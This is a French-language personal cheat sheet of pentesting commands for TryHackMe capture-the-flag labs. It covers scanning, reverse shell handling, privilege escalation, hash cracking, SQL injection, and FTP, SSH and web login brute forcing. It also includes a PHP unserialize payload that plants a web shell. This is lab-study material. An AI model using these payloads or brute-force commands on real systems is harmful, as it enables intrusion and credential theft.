# TryHackMe



https://github.com/veikoon/pentest/blob/master/commandes.md

Utilitaire :

​	wordlists: ls /usr/share/wordlists/dirb/
​	tmux : <ctrl+a> </> <*>  créer des nouvelles fenêtres

## Premier etape

**Endpoint : ** 

```
gobuster dir -k -x txt,json,php,html -u http://$IP -w /opt/wordlists/common.txt
gobuster fuzz --exclude-length XXXX -b 404 -k -u http://$IP/fuzz -w /opt/wordlist/common.txt
```

***Rechercher recursivement si tu trouve rien***



**Port : **

```
nmap -sC -sV -A -oN nmap.log $IP
```

**vulnerability :** 

```
nikto -h $IP
```

Si rien ne marche ajouter l'option -Pn au début de  nmap



## Quand cest la galère

regarde les ports scanné

scan recursivement les folder

avec big.txt

regarder crontab


## Reverse Shell

[Github des différentes reverse Shell command](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


Stabiliser bash :

```
python -c 'import pty; pty.spawn("/bin/bash")'

ctr+z

stty raw -echo; fg

ENTER
```



*Si accés a l'uppload de fichier penssé a upload un fichier reverse php ?*

**Ne pas oublier d'écouter le port**

```
nc -lvp 4242
```



## Escalation Priviledge

​	[Liste des exploit avec permission](https://gtfobins.github.io/)

```bash
Find all SUID files: "fichier executable avec une autre perm que ton user"
find / -perm -4000 -print 2>>/dev/null
Find all SGID files:
find / -perm -2000 -print 2>>/dev/null
```



```
all sudo avaible
sudo -l

(ALL, !root) => sudo -u#-1 
```



Heberger un serveur pour passer des fichier

```
python2 -m SimpleHTTPServer
```



**PWnk!it    Exploit CVE-2021-4034**  [Github  source](https://github.com/ly4k/PwnKit)
**LinPeass analyse des faille dun système** [Github Source](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)



## Hash

```
haiti -e 42f749ade7f9e195bf475f37a44cafcb
```

https://crackstation.net/

```
hashcat -m XXX(look man) -a 0 HASH.hash /opt/wordlists/rockyou.txt
```

JohnTheReapper

```
john passHash --wordlist=/opt/wordlists/rockyou.txt 
```



## Reverse Engenering

gdv ./Programme
disas main
break point
`i r` (info registry)
x/s $XXXX



gdb
jump j *@ (modifié)
breakpoint b *@

## Sql injection

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

```sql
group_concat()
```

get the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. (modifié)

```sql
information_schema
```

contains information about all the databases and tables the user has access to


## osint 

```bash
exiftool WindowsXP.jpg  
```

## Steganographie

```
mogrify -format jpg important.png
java -jar stegsolve.jar 

stegsolve
steghide extract –sf image.jpeg
stegseek hellp.jpg /opt/wordlist/common.tx
```



## Windows SMB

https://tryhackme.com/room/metasploitintro

smbclient -L $IP 
smbclien -NL $IP

nmblookup -A $IP 



msfconsole
Search   *smb/netbios*
use *auxiliary/scanner/netbios/nbname*

## FTP

medusa -h $IP -U user.txt -P ./password.txt  -M ftp
**hydra -L username.txt -P password.txt ftp://$IP**

Mfsconsole :http://10.10.95.58/Lianyu.png

```bash
auxiliary(scanner/ftp/ftp_login)

PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt   
```

Montrer fichier caché sur ftp :

**dir -la**

*

## Unserialize PHP

Si il y a une fct 

**unserialize($variable)** dans le code cherche comment ecrire dans debug une version serialisé dun payload de reverse shell en php

tu serialize

```php
<?php
class FormSubmit
{
   public $form_file = 'test.php';
   public $message = '<?php system($_GET["cmd"]); ?>';
}
print serialize(new FormSubmit);
?>
```

tu execute `php code.php`

tu navigue vers 

http://10.10.33.139/index.php?debug=O:10:%22FormSubmit%22:2:s:9:%22form_file%22;s:8:%22test.php%22;s:7:%22message%22;s:30:%22%3C?php%20system($_GET[%22cmd%22]);%20?%3E%22;}

Puis vers la page que tu as créé

http://10.10.33.139/test.php?cmd=INSSERT_TA_COMMANDE



## Crack SSH key

RSA  

```bash
ssh2john privatekey>key.haash
john --wordlist=/opt/wordlists/rockyou.txt key.hash
john --show key.haas

chmod +600 id_rsa
ssh user@$IP -i id_rsa
```

## BRUTE Force

```BASH
hydra -l molly -P rockyou.txt 10.10.219.212 http-post-form "/admin/index.php:username=^USER^&password=^PASS^:F=Your password is incorrect" -V
```

**CRUNCH** 

Generate a dictionary file containing words with a minimum and maximum length of 6 (`6 6`) using the given characters (`0123456789abcdef`), saving the output to a file (`-0 6chars.txt`):

```
crunch 6 6 0123456789abcdef -o 6chars.txt
Crunch will now generate the following amount of data: 117440512 bytes
```

